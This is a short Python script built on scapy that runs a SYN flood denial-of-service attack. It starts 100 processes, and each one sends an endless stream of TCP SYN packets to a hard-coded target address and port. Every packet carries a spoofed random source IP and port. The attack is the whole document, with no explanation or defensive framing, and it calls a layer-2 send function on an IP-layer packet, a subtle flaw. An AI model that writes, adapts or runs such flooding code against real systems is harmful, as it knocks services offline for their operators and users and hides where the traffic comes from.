from scapy.all import IP, TCP, RandIP, RandShort, sendp
from multiprocessing import Process

target_ip = "192.168.1.1"
target_port = 80
num_processes = 100

def syn_flood(target_ip, target_port):
    while True:
        src_ip = RandIP()
        src_port = RandShort()
        
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip/tcp
        
        sendp(packet, verbose=False)

for _ in range(num_processes):
    p = Process(target=syn_flood, args=(target_ip, target_port))
    p.start()
